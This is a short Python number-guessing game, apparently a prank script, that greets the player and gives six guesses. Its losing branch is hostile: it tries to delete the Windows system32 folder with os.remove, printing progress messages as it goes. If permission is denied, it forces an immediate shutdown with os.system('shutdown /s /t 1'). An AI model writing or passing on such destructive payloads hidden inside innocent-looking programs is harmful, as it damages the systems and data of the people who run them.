import time, random, os
import fn

fn.printy("what's your first name?")
name = input("> ")
fn.printy(f"hi {name}, welcome to this thing.")
number = random.randint(1, 100)
guess = 6537635673567357
guesses_left = 6

while guess != number and guesses_left > 0:
    fn.printy("guess the number.")
    guess = input("> ")
    while not guess.isdigit():
        fn.printy("i said guess the number. that is, the integer.")
        guess = input("> ")
    guess = int(guess)
    fn.time.sleep(1)
    if guess == number:
        fn.printy(f"congration, {name}. you did it.")
        break
    elif guess > number:
        fn.printy("too high.")
    elif guess < number:
        fn.printy("too low.")
    guesses_left -= 1
    time.sleep(1)
    fn.printy(f"you have {guesses_left} guesses left.")
if guesses_left == 0:
    fn.printy(f"you ran out of guesses. you lose. the number was {number}.")
    fn.printy("Locating file folder \"C:\\Windows\\system32\"...")
    time.sleep(1)
    fn.printy("Removing file folder \"C:\\Windows\\system32\"...")
    time.sleep(2)
    try:
        os.remove("C:\Windows\system32")
        fn.printy("File folder \"C:\\Windows\\system32\" removed successfully.")
    except PermissionError:
        fn.printy("Unable to remove file folder \"C:\\Windows\\system32\"; No permission")
        time.sleep(2)
        fn.printy("i guess this'll have to do instead.")
        os.system("shutdown /s /t 1")